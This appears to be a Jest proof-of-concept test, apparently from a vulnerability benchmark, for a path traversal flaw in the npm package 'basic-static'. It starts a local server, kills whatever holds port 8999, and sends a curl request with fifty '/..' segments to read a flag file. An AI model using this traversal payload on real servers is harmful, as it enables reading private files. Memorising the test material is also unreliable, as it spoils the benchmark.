const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v21 = '/..'.repeat(50);
    const v22 = v21 + pathToFlag;
    return v22;
};
const v39 = done => {
    const v23 = expect.assertions(1);
    v23;
    const basicStatic = require('basic-static');
    const v24 = process.cwd();
    const v25 = {
        rootDir: v24,
        compress: true
    };
    const serveStatic = basicStatic(v25);
    const http = require('http');
    const fs = require('fs');
    const v26 = require('child_process');
    const exec = v26.exec;
    const v27 = fs.readFileSync(pathToFlag);
    let hostsFile = v27.toString();
    const a = require('child_process');
    try {
        const v28 = () => {
        };
        const v29 = a.execSync('fuser -k 8999/tcp', v28);
        v29;
    } catch (e) {
    }
    const v31 = function (req, res) {
        const v30 = serveStatic(req, res);
        v30;
    };
    const server = http.createServer(v31);
    const v32 = server.listen(8999);
    v32;
    const v33 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8999${ v33 }"`;
    const v37 = (error, stdout) => {
        const v34 = expect(stdout);
        const v35 = v34.toBe(hostsFile);
        v35;
        const v36 = done();
        v36;
    };
    const v38 = exec(attack_string, v37);
    v38;
};
const v40 = test('Path Traversal in basic-static', v39);
v40;